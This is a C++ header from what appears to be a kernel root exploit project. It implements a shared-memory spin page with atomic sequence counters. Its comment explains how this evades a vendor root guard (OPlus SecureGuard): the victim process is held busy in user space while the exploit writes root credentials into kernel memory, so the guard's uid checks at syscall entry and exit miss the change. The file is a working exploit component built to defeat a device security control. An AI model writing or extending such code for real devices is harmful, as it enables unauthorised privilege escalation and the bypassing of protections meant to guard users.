#ifndef GHOSTLOCK_VICTIM_SPIN_H
#define GHOSTLOCK_VICTIM_SPIN_H

/*
 * The W2 victim's user-space spin window (see
 * docs/analysis/oplus-secureguard-victim-spin-plan.md).
 *
 * Some vendor root guards (OPlus SecureGuard) compare a task's uid/euid/gid/egid
 * at syscall entry and exit and kill it if any of them decreased *inside* that
 * syscall. The exploit's credential write is a raw kernel store, so it is
 * invisible unless it lands while the victim is in a syscall. This page lets
 * the parent keep the victim in EL0 (busy-waiting, no syscalls) across the
 * write, then release it; the victim's next syscall enters with uid 0 and such
 * a guard takes its "already root" early exit.
 *
 * Sequence counters, not booleans: a stale "ready" left from the previous
 * attempt must never let the parent start a route before the victim has
 * re-entered the spin.
 *
 * The helpers are atomic builtins so the same header serves the device build
 * (victim_process.cpp) and the host test.
 */

#include <cstdint>

namespace ghostlock::session::victim {
    struct SpinPage {
        uint32_t arm_seq;      /* parent -> child: arm request sequence */
        uint32_t armed_seq;    /* child -> parent: last sequence entered */
        uint32_t go_seq;       /* parent -> child: release sequence */
        uint32_t main_cpu;     /* parent -> child: route pair to stay off */
        uint32_t consumer_cpu;
        uint32_t cpu;          /* child -> parent: the CPU it pinned to, or ~0 */
        uint32_t flags;        /* child -> parent: 1 = pinned, 2 = no off-pair CPU */
        uint32_t slot;
    };

    static_assert(sizeof(SpinPage) <= 4096, "spin page must fit one mmap page");

    constexpr uint32_t kSpinCpuNone = 0xffffffffu;
    constexpr uint32_t kSpinFlagPinned = 1u;
    constexpr uint32_t kSpinFlagNoOffPairCpu = 2u;

    /* Child: called after reading the arm command. */
    inline uint32_t spin_child_begin(const SpinPage *page) {
        return __atomic_load_n(&page->arm_seq, __ATOMIC_ACQUIRE);
    }

    inline void spin_child_ready(SpinPage *page, uint32_t seq) {
        __atomic_store_n(&page->armed_seq, seq, __ATOMIC_RELEASE);
    }

    inline int32_t spin_child_released(const SpinPage *page, uint32_t seq) {
        return __atomic_load_n(&page->go_seq, __ATOMIC_ACQUIRE) == seq ? 1 : 0;
    }

    /* Parent: arm, wait, release. */
    inline uint32_t spin_parent_arm(SpinPage *page) {
        return __atomic_add_fetch(&page->arm_seq, 1u, __ATOMIC_ACQ_REL);
    }

    inline int32_t spin_parent_armed(const SpinPage *page, uint32_t seq) {
        return __atomic_load_n(&page->armed_seq, __ATOMIC_ACQUIRE) == seq ? 1 : 0;
    }

    inline void spin_parent_release(SpinPage *page, uint32_t seq) {
        __atomic_store_n(&page->go_seq, seq, __ATOMIC_RELEASE);
    }
} // namespace ghostlock::session::victim

#endif
